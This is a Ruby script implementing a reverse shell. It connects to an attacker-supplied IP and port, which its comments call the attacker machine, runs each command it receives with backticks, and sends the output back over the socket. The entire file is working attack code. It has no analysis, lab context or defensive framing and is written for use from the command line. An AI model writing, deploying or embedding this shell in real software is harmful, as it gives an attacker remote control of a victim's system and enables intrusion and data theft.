# ReverseShell class definition
class ReverseShell
  def initialize(ip, port)
    @ip = ip
    @port = port
  end

  # Method to establish a connection
  def connect
    begin
      socket = TCPSocket.new(@ip, @port) # Establishing connection to the attacker machine
      puts "[+] Connected to #{@ip}:#{@port}"
      while (cmd = socket.gets) # Listening for commands
        result = `#{cmd}` # Executing the command
        socket.puts(result) # Sending result back
      end
    rescue => e
      puts "[-] Error: #{e.message}"
    ensure
      socket.close if socket
    end
  end
end

# Main script execution
if __FILE__ == $0
  require 'socket'
  if ARGV.length != 2
    puts "Usage: ruby reverse_shell.rb <IP> <PORT>"
    exit
  end

  ip = ARGV[0]
  port = ARGV[1].to_i

  shell = ReverseShell.new(ip, port) # Creating an instance of the ReverseShell class
  shell.connect # Connecting to the attacker machine
end

